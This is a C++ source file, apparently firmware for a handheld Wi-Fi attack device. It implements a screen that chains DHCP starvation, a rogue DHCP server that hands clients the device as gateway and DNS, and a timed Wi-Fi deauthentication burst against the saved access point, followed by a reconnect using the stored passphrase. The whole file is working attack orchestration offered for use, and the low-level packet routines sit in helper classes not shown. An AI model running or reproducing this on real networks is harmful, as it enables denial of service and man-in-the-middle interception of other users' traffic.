#include "DhcpAttackScreen.h"

#include "core/Device.h"
#include "core/ScreenManager.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

DhcpAttackScreen* DhcpAttackScreen::_instance = nullptr;

static constexpr unsigned long DEAUTH_MS = 10000;

DhcpAttackScreen::~DhcpAttackScreen() {
  if (_state == STATE_RUNNING) _stop();
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void DhcpAttackScreen::onInit() {
  _showMenu();
}

void DhcpAttackScreen::onBack() {
  if (_state == STATE_RUNNING) {
    _stop();
    _showMenu();
    return;
  }
  Screen.goBack();
}

// ── Menu ────────────────────────────────────────────────────────────────────

void DhcpAttackScreen::_showMenu() {
  _state     = STATE_MENU;
  _starvSub  = _starvEnabled ? "On" : "Off";
  _rogueSub  = _rogueEnabled ? "On" : "Off";
  _deauthSub = _deauthBurst  ? "On" : "Off";

  _menuItems[0] = {"DHCP Starvation", _starvSub.c_str()};
  _menuItems[1] = {"Rogue DHCP",      _rogueSub.c_str()};
  _menuItems[2] = {"Deauth Burst",    _deauthSub.c_str()};
  _menuItems[3] = {"Start"};
  setItems(_menuItems, 4);
}

void DhcpAttackScreen::onItemSelected(uint8_t index) {
  if (_state != STATE_MENU) return;

  switch (index) {
    case 0: _starvEnabled = !_starvEnabled; _showMenu(); break;
    case 1: _rogueEnabled = !_rogueEnabled; _showMenu(); break;
    case 2: _deauthBurst  = !_deauthBurst;  _showMenu(); break;
    case 3: _start(); break;
  }
}

// ── Start ───────────────────────────────────────────────────────────────────

void DhcpAttackScreen::_start() {
  if (!_starvEnabled && !_rogueEnabled) {
    ShowStatusAction::show("Enable Starvation or Rogue DHCP!");
    return;
  }
  if (WiFi.status() != WL_CONNECTED) {
    ShowStatusAction::show("Not connected to a network!", 1500);
    return;
  }

  _state         = STATE_RUNNING;
  _log.clear();
  _lastDraw      = 0;
  _starvRunning  = false;
  _rogueRunning  = false;
  _deauthRunning = false;
  _instance      = this;

  // The reconnect after a deauth burst needs the real passphrase. WiFi.begin()
  // with a null password does NOT reuse the stored credentials: wifi_sta_config()
  // zeroes the password field and drops the auth threshold to WIFI_AUTH_OPEN,
  // so association against a WPA2 AP fails outright.
  _savedSSID     = WiFi.SSID();
  _savedPassword = WiFi.psk();
  _savedIP       = WiFi.localIP();
  _savedGateway  = WiFi.gatewayIP();
  _savedSubnet   = WiFi.subnetMask();
  _savedChannel  = WiFi.channel();
  memcpy(_savedBSSID, WiFi.BSSID(), 6);

  char buf[60];
  snprintf(buf, sizeof(buf), "[*] IP: %s", _savedIP.toString().c_str());
  _log.addLine(buf);

  // Rogue DHCP starts immediately only when there is no starvation to wait for.
  if (_rogueEnabled && !_starvEnabled) _startRogue();

  if (_starvEnabled) {
    _log.addLine("[*] DHCP Starvation...");
    render();
    if (_starv.begin()) {
      _starvRunning = true;
      snprintf(buf, sizeof(buf), "[+] Reconnected: %s",
               WiFi.localIP().toString().c_str());
      _log.addLine(buf);
    } else {
      _log.addLine("[!] Starvation failed", TFT_RED);
      _starvEnabled = false;
      if (_rogueEnabled) _startRogue();
    }
  }

  _drawLog();
}

void DhcpAttackScreen::_startRogue() {
  if (!_rogueEnabled || _rogueRunning) return;

  _rogue.setClientCallback(_onDhcpClient);
  if (_rogue.begin()) {
    _rogueRunning = true;
    _log.addLine("[+] Rogue DHCP active", TFT_GREEN);
    _log.addLine("    Gateway + DNS = us");
  } else {
    _log.addLine("[!] Rogue DHCP failed", TFT_RED);
    _rogueEnabled = false;
  }
}

// ── Deauth burst ────────────────────────────────────────────────────────────

void DhcpAttackScreen::_startDeauthBurst() {
  _log.addLine("[*] Deauth burst (10s)...");
  _drawLog();

  WiFi.disconnect(true);
  delay(100);

  _attacker      = new WifiAttackUtil();
  _deauthRunning = true;
  _deauthStart   = millis();
}

void DhcpAttackScreen::_stopDeauthBurst() {
  _deauthRunning = false;
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  _log.addLine("[+] Deauth burst done");
}

void DhcpAttackScreen::_reconnectStaticIP() {
  _log.addLine("[*] Reconnecting (static IP)...");
  _drawLog();

  WiFi.mode(WIFI_STA);
  WiFi.config(_savedIP, _savedGateway, _savedSubnet, _savedGateway);
  WiFi.begin(_savedSSID.c_str(), _savedPassword.c_str(), _savedChannel, _savedBSSID);

  const unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) delay(100);

  char buf[60];
  if (WiFi.status() == WL_CONNECTED) {
    snprintf(buf, sizeof(buf), "[+] Reconnected: %s", WiFi.localIP().toString().c_str());
    _log.addLine(buf);
  } else {
    _log.addLine("[!] Reconnect failed", TFT_RED);
  }
}

// ── Stop ────────────────────────────────────────────────────────────────────

void DhcpAttackScreen::_stop() {
  if (_deauthRunning) _stopDeauthBurst();
  if (_starvRunning)  { _starv.stop(); _starvRunning = false; }
  if (_rogueRunning)  { _rogue.stop(); _rogueRunning = false; }

  _instance     = nullptr;
  _starvEnabled = _rogueEnabled = _deauthBurst = false;
  _state        = STATE_MENU;
  _log.clear();

  ShowStatusAction::show("Stopped", 1000);
}

// ── Update ──────────────────────────────────────────────────────────────────

void DhcpAttackScreen::onUpdate() {
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      _showMenu();
      return;
    }
  }

  if (_rogueRunning && !_starvRunning) _rogue.update();

  if (_deauthRunning) {
    if (millis() - _deauthStart >= DEAUTH_MS) {
      _stopDeauthBurst();
      _reconnectStaticIP();
      _startRogue();
    } else if (_attacker) {
      _attacker->deauthenticate(_savedBSSID, _savedChannel);
      delay(50);
    }
  }

  if (_starvRunning) {
    _starv.step();

    if (_starv.isExhausted()) {
      _starvRunning = false;
      _starv.stop();

      const auto& s = _starv.stats();
      char buf[60];
      snprintf(buf, sizeof(buf), "[+] Pool exhausted! ACK:%lu NAK:%lu",
               (unsigned long)s.ack, (unsigned long)s.nak);
      _log.addLine(buf, TFT_GREEN);

      if (_deauthBurst) _startDeauthBurst();
      else              _startRogue();

    } else if (_starv.isStuck()) {
      _starvRunning = false;
      _starv.stop();
      _log.addLine("[!] Starvation stuck", TFT_RED);
      _log.addLine("    Server keys on chaddr", TFT_DARKGREY);
      _startRogue();
    }
  }

  if (millis() - _lastDraw > 800) {
    render();
    _lastDraw = millis();
  }
}

void DhcpAttackScreen::onRender() {
  if (_state == STATE_RUNNING) { _drawLog(); return; }
  ListScreen::onRender();
}

// ── Callbacks ───────────────────────────────────────────────────────────────

void DhcpAttackScreen::_onDhcpClient(const char* mac, const char* ip) {
  if (!_instance) return;
  char buf[60];
  snprintf(buf, sizeof(buf), "[+] DHCP %s", ip);
  _instance->_log.addLine(buf, TFT_GREEN);
}

// ── Log ─────────────────────────────────────────────────────────────────────

void DhcpAttackScreen::_drawLog() {
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](Sprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<DhcpAttackScreen*>(ud);
      sp.setTextColor(TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char label[48];

      if (s->_deauthRunning) {
        int left = (int)((DEAUTH_MS - (millis() - s->_deauthStart)) / 1000);
        if (left < 0) left = 0;
        snprintf(label, sizeof(label), "Deauth: %ds left", left);
      } else if (s->_starvRunning) {
        const auto& st = s->_starv.stats();
        snprintf(label, sizeof(label), "A:%lu N:%lu T:%lu CT:%d/20",
                 (unsigned long)st.ack, (unsigned long)st.nak,
                 (unsigned long)st.timeout, s->_starv.consecutiveTimeouts());
      } else if (s->_rogueRunning) {
        snprintf(label, sizeof(label), "DHCP: %d clients", s->_rogue.clientCount());
      } else {
        snprintf(label, sizeof(label), "Running");
      }
      sp.drawString(label, 2, barY);
    }, this);
}
